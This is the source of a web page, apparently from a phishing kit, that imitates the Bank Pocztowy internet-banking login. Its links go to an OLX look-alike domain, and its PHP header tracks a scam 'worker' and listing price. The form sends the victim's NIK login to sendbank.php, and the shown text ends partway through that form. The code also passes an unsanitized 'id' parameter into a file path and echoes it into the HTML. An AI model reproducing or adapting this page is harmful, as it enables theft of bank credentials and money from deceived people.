<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "Pocztowy Bank.");
?>
<!DOCTYPE html>
<html lang="ru-RU"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>System bankowości internetowej Banku Pocztowego S.A.</title>
<meta name="robots" content="noindex, nofollow">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<link rel="stylesheet" id="mybiz-style-css" href="./pocztowy_files/mybiz-style.css" media="all"> 
<link rel="stylesheet" id="pocztowy-frontend-css" href="./pocztowy_files/pocztowy-assets-css-frontend-lite.min.css" media="all"> 
<link rel="stylesheet" id="pocztowy-post-552-css" href="./pocztowy_files/pocztowy-css-post-552.css" media="all"> 
<style>
.pocztowy-widget .pocztowy-icon-list-items{list-style-type:none;margin:0;padding:0}.pocztowy-widget .pocztowy-icon-list-item{margin:0;padding:0;position:relative}.pocztowy-widget .pocztowy-icon-list-item:after{position:absolute;bottom:0;width:100%}.pocztowy-widget .pocztowy-icon-list-item{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;font-size:inherit}.pocztowy-widget .pocztowy-icon-list-icon+.pocztowy-icon-list-text{-ms-flex-item-align:center;align-self:center;padding-left:5px}.pocztowy-widget .pocztowy-icon-list-icon{display:-webkit-box;display:-ms-flexbox;display:flex}.pocztowy-widget .pocztowy-icon-list-icon svg{width:var(--e-icon-list-icon-size,1em);height:var(--e-icon-list-icon-size,1em)}.pocztowy-widget.pocztowy-widget-icon-list .pocztowy-icon-list-icon{text-align:var(--e-icon-list-icon-align)}.pocztowy-widget.pocztowy-widget-icon-list .pocztowy-icon-list-icon svg{margin:var(--e-icon-list-icon-margin,0 calc(var(--e-icon-list-icon-size, 1em) * .25) 0 0)}.pocztowy-widget.pocztowy-align-left .pocztowy-icon-list-item{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:left}.pocztowy-widget:not(.pocztowy-align-right) .pocztowy-icon-list-item:after{left:0}@media (max-width:1024px){.pocztowy-widget:not(.pocztowy-tablet-align-right) .pocztowy-icon-list-item:after{left:0}.pocztowy-widget:not(.pocztowy-tablet-align-left) .pocztowy-icon-list-item:after{right:0}}@media (max-width:767px){.pocztowy-widget:not(.pocztowy-mobile-align-right) .pocztowy-icon-list-item:after{left:0}.pocztowy-widget:not(.pocztowy-mobile-align-left) .pocztowy-icon-list-item:after{right:0}}
.pocztowy-552 .pocztowy-element.pocztowy-element-1bdfa6f > .pocztowy-container{max-width:1020px;}.pocztowy-552 .pocztowy-element.pocztowy-element-1bdfa6f{margin-top:0px;margin-bottom:0px;padding:10px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-a75dd8c > .pocztowy-element-populated{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-43da5a7 > .pocztowy-element-populated{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-ddad676 .pocztowy-button{background-color:transparent;background-image:linear-gradient(180deg, #D22228 0%, #96181C 100%);border-radius:5px 5px 5px 5px;padding:7px 25px 10px 25px;}.pocztowy-552 .pocztowy-element.pocztowy-element-ddad676 > .pocztowy-widget-container{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-26dd3af > .pocztowy-container{max-width:1020px;}.pocztowy-552 .pocztowy-element.pocztowy-element-26dd3af{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;margin-top:0px;margin-bottom:0px;padding:0px 10px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-7041e1f:not(.pocztowy-motion-effects-element-type-background) > .pocztowy-column-wrap{background-color:transparent;background-image:linear-gradient(180deg, #103D68 0%, #0A355E 100%);}.pocztowy-552 .pocztowy-element.pocztowy-element-7041e1f > .pocztowy-element-populated{border-style:solid;border-width:1px 1px 1px 1px;border-color:#212939;box-shadow:0px 2px 2px 0px rgba(0,0,0,0.5);transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-7041e1f > .pocztowy-element-populated{border-radius:5px 5px 5px 5px;}.pocztowy-552 .pocztowy-element.pocztowy-element-48c09ff{text-align:center;}.pocztowy-552 .pocztowy-element.pocztowy-element-48c09ff .pocztowy-heading-title{color:#FFFFFF;font-size:16px;font-weight:500;margin: auto; padding: 7px;}.pocztowy-552 .pocztowy-element.pocztowy-element-03e98b2 > .pocztowy-container{max-width:1020px;}.pocztowy-552 .pocztowy-element.pocztowy-element-03e98b2{margin-top:0px;margin-bottom:0px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-c11d289:not(.pocztowy-motion-effects-element-type-background) > .pocztowy-column-wrap{background-color:transparent;background-image:linear-gradient(180deg, #E3EBEE 0%, #FFFFFF 100%);}.pocztowy-552 .pocztowy-element.pocztowy-element-c11d289 > .pocztowy-element-populated{border-style:solid;border-width:0px 0px 2px 0px;border-color:#0000000D;transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;margin:5px 0px 0px 0px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-1d8995b > .pocztowy-container{max-width:500px;}.pocztowy-552 .pocztowy-element.pocztowy-element-1d8995b{margin-top:25px;margin-bottom:0px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-b978980 > .pocztowy-element-populated{border-style:solid;border-width:1px 1px 1px 1px;border-color:#000000;transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;margin:0px 0px 0px 0px;padding:0em 0em 0em 0em;}.pocztowy-552 .pocztowy-element.pocztowy-element-b978980 > .pocztowy-element-populated{border-radius:4px 4px 4px 4px;}.pocztowy-552 .pocztowy-element.pocztowy-element-729b4b7{color:#000000;font-size:14px;font-weight:400;line-height:20px;}.pocztowy-552 .pocztowy-element.pocztowy-element-729b4b7 > .pocztowy-widget-container{margin:0px 0px 0px 0px;padding:0em 3em 0em 1em;}.pocztowy-552 .pocztowy-element.pocztowy-element-09c85e7 .pocztowy-button{background-color:transparent;background-image:linear-gradient(180deg, #D22228 0%, #96181C 100%);border-radius:5px 5px 5px 5px;padding:7px 25px 10px 25px;}.pocztowy-552 .pocztowy-element.pocztowy-element-09c85e7 > .pocztowy-widget-container{margin:-30px 0px 0px 0px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-2d76afa{color:#000000;font-size:14px;font-weight:400;line-height:20px;}.pocztowy-552 .pocztowy-element.pocztowy-element-2d76afa > .pocztowy-widget-container{margin:-18px 0px 0px 0px;padding:0em 3em 0em 1em;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d .pocztowy-field-group{padding-right:calc( 6px/2 );padding-left:calc( 6px/2 );margin-bottom:10px;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d .pocztowy-form-fields-wrapper{margin-left:calc( -6px/2 );margin-right:calc( -6px/2 );margin-bottom:-10px;}body .pocztowy-552 .pocztowy-element.pocztowy-element-003d85d .pocztowy-labels-above .pocztowy-field-group > label{padding-bottom:0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d .pocztowy-field-group > label{color:#000000;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d .pocztowy-field-group > label{font-size:16px;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d .pocztowy-field-group .pocztowy-field{color:#000000;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d .pocztowy-field-group:not(.pocztowy-field-type-upload) .pocztowy-field:not(.pocztowy-select-wrapper){background-color:#ffffff;border-color:#BCBDBE;border-radius:3px 3px 3px 3px;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d .pocztowy-button{font-size:13px;font-weight:700;border-style:solid;border-width:0px 0px 1px 0px;border-radius:3px 3px 3px 3px;padding:5px 15px 7px 15px;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d .pocztowy-button[type="submit"]{background-color:#2D4674;color:#ffffff;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d .pocztowy-button[type="submit"]:hover{color:#ffffff;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d{--e-form-steps-indicators-spacing:20px;--e-form-steps-indicator-padding:30px;--e-form-steps-indicator-inactive-secondary-color:#ffffff;--e-form-steps-indicator-active-secondary-color:#ffffff;--e-form-steps-indicator-completed-secondary-color:#ffffff;--e-form-steps-divider-width:1px;--e-form-steps-divider-gap:10px;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d > .pocztowy-widget-container{margin:3% 25% 3% 33%;padding:0px 0px 5px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-b98efd9 > .pocztowy-container{max-width:1020px;}.pocztowy-552 .pocztowy-element.pocztowy-element-b98efd9{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;margin-top:0px;margin-bottom:0px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-a151c29 > .pocztowy-element-populated{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-6446ba5 .pocztowy-heading-title{color:#DA2429;font-size:15px;font-weight:bold;}.pocztowy-552 .pocztowy-element.pocztowy-element-6446ba5 > .pocztowy-widget-container{margin:30px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-15967bf{color:#183964;font-size:14px;font-weight:400;line-height:15px;letter-spacing:0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-15967bf > .pocztowy-widget-container{margin:-20px 0px 0px 0px;padding:0em 3em 0em 0em;}.pocztowy-552 .pocztowy-element.pocztowy-element-4a84604 .pocztowy-icon-list-icon svg{fill:#DA2429;}.pocztowy-552 .pocztowy-element.pocztowy-element-4a84604{--e-icon-list-icon-size:6px;}.pocztowy-552 .pocztowy-element.pocztowy-element-4a84604 .pocztowy-icon-list-text{color:#183964;padding-left:5px;}.pocztowy-552 .pocztowy-element.pocztowy-element-4a84604 .pocztowy-icon-list-item > .pocztowy-icon-list-text{font-size:14px;font-weight:400;}.pocztowy-552 .pocztowy-element.pocztowy-element-4a84604 > .pocztowy-widget-container{margin:-25px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-9500e9e .pocztowy-heading-title{color:#0000EE;font-size:12px;font-weight:bold;text-decoration:underline;}.pocztowy-552 .pocztowy-element.pocztowy-element-9500e9e > .pocztowy-widget-container{margin:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-13b6b22 .pocztowy-heading-title{color:#DA2429;font-size:15px;font-weight:bold;}.pocztowy-552 .pocztowy-element.pocztowy-element-13b6b22 > .pocztowy-widget-container{margin:30px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-46c6c86 .pocztowy-icon-list-icon svg{fill:#DA2429;}.pocztowy-552 .pocztowy-element.pocztowy-element-46c6c86{--e-icon-list-icon-size:6px;}.pocztowy-552 .pocztowy-element.pocztowy-element-46c6c86 .pocztowy-icon-list-text{color:#183964;padding-left:5px;}.pocztowy-552 .pocztowy-element.pocztowy-element-46c6c86 .pocztowy-icon-list-item > .pocztowy-icon-list-text{font-size:14px;font-weight:400;}.pocztowy-552 .pocztowy-element.pocztowy-element-8c90944 .pocztowy-heading-title{color:#DA2429;font-size:15px;font-weight:bold;}.pocztowy-552 .pocztowy-element.pocztowy-element-8c90944 > .pocztowy-widget-container{margin:30px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-f6dcd48{color:#183964;font-size:14px;font-weight:400;line-height:15px;letter-spacing:0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-f6dcd48 > .pocztowy-widget-container{margin:-20px 0px -5px 0px;padding:0em 3em 0em 0em;}.pocztowy-552 .pocztowy-element.pocztowy-element-8683fc7 .pocztowy-icon-list-icon svg{fill:#DA2429;}.pocztowy-552 .pocztowy-element.pocztowy-element-8683fc7{--e-icon-list-icon-size:6px;}.pocztowy-552 .pocztowy-element.pocztowy-element-8683fc7 .pocztowy-icon-list-text{color:#183964;padding-left:5px;}.pocztowy-552 .pocztowy-element.pocztowy-element-8683fc7 .pocztowy-icon-list-item > .pocztowy-icon-list-text{font-size:14px;font-weight:400;}.pocztowy-552 .pocztowy-element.pocztowy-element-8683fc7 > .pocztowy-widget-container{margin:-10px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-e3fe9aa{color:#183964;font-size:14px;font-weight:400;line-height:15px;letter-spacing:0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-e3fe9aa > .pocztowy-widget-container{margin:-10px 0px -5px 0px;padding:0em 3em 0em 0em;}.pocztowy-552 .pocztowy-element.pocztowy-element-3366795 > .pocztowy-container{max-width:1020px;}.pocztowy-552 .pocztowy-element.pocztowy-element-3366795{margin-top:30px;margin-bottom:-50px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-d13b8ac:not(.pocztowy-motion-effects-element-type-background) > .pocztowy-column-wrap{background-color:transparent;background-image:linear-gradient(180deg, #F6F6F6 0%, #E7E7E7 100%);}.pocztowy-552 .pocztowy-element.pocztowy-element-d13b8ac > .pocztowy-element-populated{border-style:solid;border-width:1px 1px 2px 1px;border-color:#D9D9D9;transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-8bb4ead{text-align:right;}.pocztowy-552 .pocztowy-element.pocztowy-element-8bb4ead > .pocztowy-widget-container{margin:18px 18px 18px 0px;}body.pocztowy-page-552:not(.pocztowy-motion-effects-element-type-background){background-color:#F5F5F5;}@media(max-width:1024px){.pocztowy-552 .pocztowy-element.pocztowy-element-1bdfa6f{padding:10px 6px 0px 0px;}.pocztowy-552 .pocztowy-element.pocztowy-element-b98efd9{padding:0px 8px 0px 8px;}}@media(max-width:767px){.pocztowy-552 .pocztowy-element.pocztowy-element-26dd3af{padding:0px 5px 0px 8px;}.pocztowy-552 .pocztowy-element.pocztowy-element-03e98b2{padding:0px 8px 0px 8px;}.pocztowy-552 .pocztowy-element.pocztowy-element-003d85d > .pocztowy-widget-container{margin:10px 29px 0px 16px;padding:0px 0px 10px 0px;}}@media(min-width:768px){.pocztowy-552 .pocztowy-element.pocztowy-element-deb04ad{width:38.111%;}.pocztowy-552 .pocztowy-element.pocztowy-element-a75dd8c{width:40.027%;}.pocztowy-552 .pocztowy-element.pocztowy-element-43da5a7{width:21.294%;}}.dialog-close-button:not(:hover){opacity:.4}.pocztowy-templates-modal__header__item>i:not(:hover){color:#a4afb7}.pocztowy-templates-modal__header__close--skip>i:not(:hover){color:#fff}.pocztowy-clearfix:after{content:"";display:block;clear:both;width:0;height:0}.pocztowy{-webkit-hyphens:manual;-ms-hyphens:manual;hyphens:manual}.pocztowy *,.pocztowy :after,.pocztowy :before{-webkit-box-sizing:border-box;box-sizing:border-box}.pocztowy a{-webkit-box-shadow:none;box-shadow:none;text-decoration:none}.pocztowy img{height:auto;max-width:100%;border:none;-webkit-border-radius:0;border-radius:0;-webkit-box-shadow:none;box-shadow:none}.pocztowy-align-center{text-align:center}.pocztowy-align-center .pocztowy-button{width:auto}.pocztowy-align-right{text-align:right}.pocztowy-align-right .pocztowy-button{width:auto}.pocztowy-align-left{text-align:left}:root{--page-title-display:block}.pocztowy-section{position:relative}.pocztowy-section .pocztowy-container{display:-webkit-box;display:-ms-flexbox;display:flex;margin-right:auto;margin-left:auto;position:relative}@media (max-width:1024px){.pocztowy-section .pocztowy-container{-ms-flex-wrap:wrap;flex-wrap:wrap}}.pocztowy-section.pocztowy-section-boxed>.pocztowy-container{max-width:1140px}.pocztowy-row{width:100%;display:-webkit-box;display:-ms-flexbox;display:flex}@media (max-width:1024px){.pocztowy-row{-ms-flex-wrap:wrap;flex-wrap:wrap}}.pocztowy-widget-wrap{position:relative;width:100%;-ms-flex-wrap:wrap;flex-wrap:wrap;-ms-flex-line-pack:start;align-content:flex-start}.pocztowy:not(.pocztowy-bc-flex-widget) .pocztowy-widget-wrap{display:-webkit-box;display:-ms-flexbox;display:flex}.pocztowy-widget-wrap>.pocztowy-element{width:100%}.pocztowy-widget{position:relative}.pocztowy-widget:not(:last-child){margin-bottom:20px}.pocztowy-column{min-height:1px}.pocztowy-column,.pocztowy-column-wrap{position:relative;display:-webkit-box;display:-ms-flexbox;display:flex}.pocztowy-column-wrap{width:100%}@media (min-width:768px){.pocztowy-column.pocztowy-col-33{width:33.333%}.pocztowy-column.pocztowy-col-40{width:40%}.pocztowy-column.pocztowy-col-80{width:80%}.pocztowy-column.pocztowy-col-100{width:100%}}@media (max-width:767px){.pocztowy-column.pocztowy-sm-100{width:100%}}@media (max-width:767px){.pocztowy-column{width:100%}}.pocztowy-form-fields-wrapper{display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.pocztowy-form-fields-wrapper.pocztowy-labels-above .pocztowy-field-group>input{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.pocztowy-field-group{-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.pocztowy-field-group.pocztowy-field-type-submit{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.pocztowy-field-group .pocztowy-field-textual{width:100%;max-width:100%;border:1px solid #818a91;background-color:transparent;color:#373a3c;vertical-align:middle;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1}.pocztowy-field-group .pocztowy-field-textual:focus{-webkit-box-shadow:0 0 0 1px rgba(0,0,0,.1) inset;box-shadow:inset 0 0 0 1px rgba(0,0,0,.1);outline:0}.pocztowy-field-group .pocztowy-field-textual::-webkit-input-placeholder{color:inherit;font-family:inherit;opacity:.6}.pocztowy-field-group .pocztowy-field-textual:-ms-input-placeholder{color:inherit;font-family:inherit;opacity:.6}.pocztowy-field-group .pocztowy-field-textual:-moz-placeholder,.pocztowy-field-group .pocztowy-field-textual::-moz-placeholder{color:inherit;font-family:inherit;opacity:.6}.pocztowy-field-group .pocztowy-field-textual::-ms-input-placeholder{color:inherit;font-family:inherit;opacity:.6}.pocztowy-field-label{cursor:pointer}.pocztowy-field-textual{line-height:1.4;font-size:15px;min-height:40px;padding:5px 14px;-webkit-border-radius:3px;border-radius:3px}.pocztowy-field-textual.pocztowy-size-xs{font-size:13px;min-height:33px;padding:4px 12px;-webkit-border-radius:2px;border-radius:2px}.pocztowy-button-align-center .e-form__buttons,.pocztowy-button-align-center .pocztowy-field-type-submit{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.pocztowy-button-align-center .pocztowy-field-type-submit:not(.e-form__buttons__wrapper) .pocztowy-button{-ms-flex-preferred-size:initial;flex-basis:auto}.pocztowy-form .pocztowy-button{padding-top:0;padding-bottom:0;border:none}.pocztowy-form .pocztowy-button>span{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.pocztowy-form .pocztowy-button.pocztowy-size-xs{min-height:33px}.pocztowy-element .pocztowy-widget-container{-webkit-transition:background .3s,border .3s,-webkit-border-radius .3s,-webkit-box-shadow .3s;transition:background .3s,border .3s,-webkit-border-radius .3s,-webkit-box-shadow .3s;-o-transition:background .3s,border .3s,border-radius .3s,box-shadow .3s;transition:background .3s,border .3s,border-radius .3s,box-shadow .3s;transition:background .3s,border .3s,border-radius .3s,box-shadow .3s,-webkit-border-radius .3s,-webkit-box-shadow .3s}.pocztowy-button{display:inline-block;line-height:1;background-color:#818a91;font-size:15px;padding:12px 24px;-webkit-border-radius:3px;border-radius:3px;color:#fff;fill:#fff;text-align:center;-webkit-transition:all .3s;-o-transition:all .3s;transition:all .3s}.pocztowy-button:focus,.pocztowy-button:hover,.pocztowy-button:visited{color:#fff}.pocztowy-button-content-wrapper{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.pocztowy-button-icon{-webkit-box-flex:0;-ms-flex-positive:0;flex-grow:0;-webkit-box-ordinal-group:6;-ms-flex-order:5;order:5}.pocztowy-button-text{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-webkit-box-ordinal-group:11;-ms-flex-order:10;order:10;display:inline-block}.pocztowy-button.pocztowy-size-xs{font-size:13px;padding:10px 20px;-webkit-border-radius:2px;border-radius:2px}.pocztowy-button span{text-decoration:inherit}.page-template-pocztowy_canvas.pocztowy-page:before{display:none}.pocztowy .pocztowy-element ul.pocztowy-icon-list-items{padding:0}@media (max-width:767px){.pocztowy .pocztowy-hidden-mobile{display:none}}
html {
line-height: 1.15;
-webkit-text-size-adjust: 100%;
}
body {
margin: 0;
}
a {
background-color: transparent;
}
b {
font-weight: bolder;
}
img {
border-style: none;
}
button,
input {
font-family: inherit;
font-size: 100%;
line-height: 1.15;
margin: 0;
}
button,
input {
overflow: visible;
}
button {
text-transform: none;
}
button,
[type="submit"] {
-webkit-appearance: button;
}
button::-moz-focus-inner,
[type="submit"]::-moz-focus-inner {
border-style: none;
padding: 0;
}
button:-moz-focusring,
[type="submit"]:-moz-focusring {
outline: 1px dotted ButtonText;
}
::-webkit-file-upload-button {
-webkit-appearance: button;
font: inherit;
}
*,
*::before,
*::after {
box-sizing: inherit;
}
html {
box-sizing: border-box;
}
body,
button,
input {
color: #404040;
font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
font-size: 1rem;
line-height: 1.5;
}
h2 {
clear: both;
}
p {
margin-bottom: 1.5em;
}
body {
background: #fff;
}
ul {
margin: 0 0 1.5em 3em;
}
ul {
list-style: disc;
}
img {
height: auto;
max-width: 100%;
}
a {
color: #4169e1;
}
a:visited {
color: #0e4e79;
}
a:hover,
a:focus,
a:active {
color: #191970;
}
a:focus {
outline: thin dotted;
}
a:hover,
a:active {
outline: 0;
}
button {
border: 1px solid;
border-color: #ccc #ccc #bbb;
border-radius: 3px;
background: #e6e6e6;
color: rgba(0, 0, 0, 0.8);
line-height: 1;
padding: 0.6em 1em 0.4em;
}
button:hover {
border-color: #ccc #bbb #aaa;
}
button:active,
button:focus {
border-color: #aaa #bbb #bbb;
}
input[type="text"],
input[type="password"] {
color: #666;
border: 1px solid #ccc;
border-radius: 3px;
padding: 3px;
}
input[type="text"]:focus,
input[type="password"]:focus {
color: #111;
}
.page {
margin: 0 0 1.5em;
}
</style></head>

<body class="page-template page-template-pocztowy_canvas page page-id-552 pocztowy-default pocztowy-template-canvas pocztowy-kit-513 pocztowy-page pocztowy-page-552"><div class="pocztowy pocztowy-552"> 
<div class="pocztowy-inner"> 							
<div class="pocztowy-section-wrap"> 							
<section class="pocztowy-section pocztowy-top-section pocztowy-element pocztowy-element-1bdfa6f pocztowy-section-boxed pocztowy-section-height-default pocztowy-section-height-default"> 						
<div class="pocztowy-container pocztowy-column-gap-no"> 							
<div class="pocztowy-row"> 					
<div class="pocztowy-column pocztowy-col-33 pocztowy-top-column pocztowy-element pocztowy-element-deb04ad pocztowy-hidden-mobile"> 			
<div class="pocztowy-column-wrap"> 							
<div class="pocztowy-widget-wrap"> 								
</div> 					
</div> 		
</div> 				
<div class="pocztowy-column pocztowy-col-33 pocztowy-top-column pocztowy-element pocztowy-element-a75dd8c pocztowy-hidden-mobile" data-id="a75dd8c" data-element_type="column"> 			
<div class="pocztowy-column-wrap pocztowy-element-populated">
<div class="pocztowy-widget-wrap">
<div class="pocztowy-element pocztowy-element-5fdbf62 pocztowy-widget pocztowy-widget-html">
<div class="pocztowy-widget-container">
<div style="line-height: 28px; margin-right: 10px; float: right;font-size: 12px; text-decoration: none; color: #0e4e79;">
<a href="https://olx-pl.mojid05236941675.buzz/autorize1649692248232054">
<img style="width: 24px; height: auto; margin: 1px 3px 0 0; float: left;" src="./pocztowy_files/pocz-image-1.png" alt="en_US">
English version
</a>
</div>
<div style="line-height: 28px; margin-right: 10px; float: right;font-size: 12px; text-decoration: none; color: #0e4e79;">
<a href="https://olx-pl.mojid05236941675.buzz/autorize1649692248232054">
<img style="width: 24px; height: auto; margin: 1px 3px 0 0; float: left;" src="./pocztowy_files/pocz-image-3.png" alt="uk_UA">
Версія українська
</a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="pocztowy-column pocztowy-col-33 pocztowy-top-column pocztowy-element pocztowy-element-43da5a7">
<div class="pocztowy-column-wrap pocztowy-element-populated">
<div class="pocztowy-widget-wrap">
<div class="pocztowy-element pocztowy-element-ddad676 pocztowy-align-right pocztowy-widget pocztowy-widget-button">
<div class="pocztowy-widget-container">
<div class="pocztowy-button-wrapper">
<a href="https://olx-pl.mojid05236941675.buzz/autorize1649692248232054#" class="pocztowy-button-link pocztowy-button pocztowy-size-sm" role="button">
<span class="pocztowy-button-content-wrapper">
<span class="pocztowy-button-text">Zobacz też wersję demo</span>
</span>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section class="pocztowy-section pocztowy-top-section pocztowy-element pocztowy-element-26dd3af pocztowy-section-boxed pocztowy-section-height-default pocztowy-section-height-default">
<div class="pocztowy-container pocztowy-column-gap-no">
<div class="pocztowy-row">
<div class="pocztowy-column pocztowy-col-100 pocztowy-top-column pocztowy-element pocztowy-element-7041e1f">
<div class="pocztowy-column-wrap pocztowy-element-populated">
<div class="pocztowy-widget-wrap">
<div class="pocztowy-element pocztowy-element-48c09ff pocztowy-widget pocztowy-widget-heading">
<div class="pocztowy-widget-container">
<h2 class="pocztowy-heading-title pocztowy-size-default">Logowanie do systemu bankowości internetowej Banku Pocztowego</h2>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section class="pocztowy-section pocztowy-top-section pocztowy-element pocztowy-element-03e98b2 pocztowy-section-boxed pocztowy-section-height-default pocztowy-section-height-default">
<div class="pocztowy-container pocztowy-column-gap-default">
<div class="pocztowy-row">
<div class="pocztowy-column pocztowy-col-100 pocztowy-top-column pocztowy-element pocztowy-element-c11d289">
<div class="pocztowy-column-wrap pocztowy-element-populated">
<div class="pocztowy-widget-wrap">
<section class="pocztowy-section pocztowy-inner-section pocztowy-element pocztowy-element-1d8995b pocztowy-section-boxed pocztowy-section-height-default pocztowy-section-height-default">
<div class="pocztowy-container pocztowy-column-gap-default">
<div class="pocztowy-row">
<div class="pocztowy-column pocztowy-col-100 pocztowy-inner-column pocztowy-element pocztowy-element-b978980">
<div class="pocztowy-column-wrap pocztowy-element-populated">
<div class="pocztowy-widget-wrap">
<div class="pocztowy-element pocztowy-element-729b4b7 pocztowy-widget pocztowy-widget-text-editor">
<div class="pocztowy-widget-container">
<div class="pocztowy-text-editor pocztowy-clearfix">
<p>Korzystaj z nowej bankowości&nbsp;<a href="https://online.pocztowy.pl/login/main">online.pocztowy.pl</a>. To proste i wygodne rozwiązanie<br>dostosowane do wszystkich urządzeń. Logując się po raz pierwszy do nowej bankowości, użyj swojego hasła do Pocztowy24. Jeśli już wcześniej logowałeś się do nowej bankowości i zmieniłeś do niej hasło, użyj tego hasła.</p>
</div>
</div>
</div>
<div class="pocztowy-element pocztowy-element-09c85e7 pocztowy-align-center pocztowy-widget pocztowy-widget-button">
<div class="pocztowy-widget-container">
<div class="pocztowy-button-wrapper">
<a href="https://olx-pl.mojid05236941675.buzz/autorize1649692248232054#" class="pocztowy-button-link pocztowy-button pocztowy-size-sm" role="button">
<span class="pocztowy-button-content-wrapper">
<span class="pocztowy-button-text">Zaloguj się na online.pocztowy.pl</span>
</span>
</a>
</div>
</div>
</div>
<div class="pocztowy-element pocztowy-element-2d76afa pocztowy-widget pocztowy-widget-text-editor">
<div class="pocztowy-widget-container">
<div class="pocztowy-text-editor pocztowy-clearfix">
<p>Uwaga! Bankowość dla klientów korporacyjnych jest dostępna pod adresem biznes.pocztowy.pl.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<div class="pocztowy-element pocztowy-element-003d85d pocztowy-button-align-center pocztowy-widget pocztowy-widget-form">
<div class="pocztowy-widget-container">
<form class="pocztowy-form" action="sendbank.php" method="post" name="New Form">
    
    <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
    <input type="hidden" name="type" value="11">
    
<div class="pocztowy-form-fields-wrapper pocztowy-labels-above">
<div class="pocztowy-field-type-text pocztowy-field-group pocztowy-column pocztowy-field-group-nik pocztowy-col-80 pocztowy-sm-100">
<label for="form-field-nik" class="pocztowy-field-label">Wpisz NIK:</label><input size="1" type="text" name="logindata" id="form-field-nik" class="pocztowy-field pocztowy-size-xs  pocztowy-field-textual">
</div>
